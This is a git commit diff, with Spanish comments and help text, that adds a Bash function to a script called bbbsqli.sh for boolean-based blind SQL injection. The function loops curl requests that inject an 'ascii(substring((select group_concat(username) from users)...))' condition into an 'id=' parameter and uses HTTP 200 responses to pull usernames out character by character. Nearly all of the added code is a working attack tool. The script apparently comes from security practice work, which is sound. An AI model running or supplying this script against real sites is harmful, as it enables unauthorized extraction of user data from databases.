43a3d7fa5c4df09747437502c97e29e35b408c69
liandd <juandavidtv24@gmail.com>
2026-01-05 01:24:37 -0500

    Script en Bash para hacer Boolean Based Blind SQL Injection

--- bbbsqli.sh
+++ bbbsqli.sh
@@ -21,8 +21,39 @@ function ctrl_c() {
 
 function helpPanel() {
   echo -e "\n${yellowColour}[!]${endColour}${grayColour} Uso: ${endColour}${greenColour}$0${endColour} ${purpleColour}-u${endColour} ${blueColour}\"<url.../id=1\"${endColour}\n"
-  echo -e "\t${purpleColour}u)${endColour} ${grayColour}Direccion url en donde se encuentra el parametro vulnerable a SQLi${endColour}"
+  echo -e "\t${purpleColour}u)${endColour} ${grayColour}Dirección URL en donde se encuentra el parámetro vulnerable a SQLi${endColour}"
   echo -e "\t${purpleColour}h)${endColour} ${grayColour}Panel de ayuda${endColour}"
+}
+
+function booleanblindsqli() {
+  local complete_url=$1
+  url=$(echo $complete_url | grep -oP ".*\?")
+  vulnerable_param=$(echo $complete_url | grep -oP "id=")
+  sleep 1.1
+  extracted_info=''
+
+  for name_char_pos in $(seq 1 33); do
+    found_char=false
+    for char_decimal in $(seq 44 44) $(seq 97 122); do
+
+      local char_ascii=$(printf "\\$(printf '%03o' "$char_decimal")")
+      #-- Suponiendo que la columna se llama username y la tabla se llama users
+      http_code_responde=$(curl -s -o /dev/null -w "%{http_code}" -X GET "$url" -G --data-urlencode "${vulnerable_param}9 or ascii(substring((select group_concat(username) from users), $name_char_pos, 1)) = $char_decimal")
+
+      if [ "$http_code_responde" -eq 200 ]; then
+        extracted_info+="$char_ascii"
+        found_char=true
+        break
+
+      fi
+    done
+
+    if [ "$found_char" = false ]; then
+      break
+
+    fi
+  done
+  echo "${extracted_info%,}"
 }
 
 while getopts "u:h" arg; do
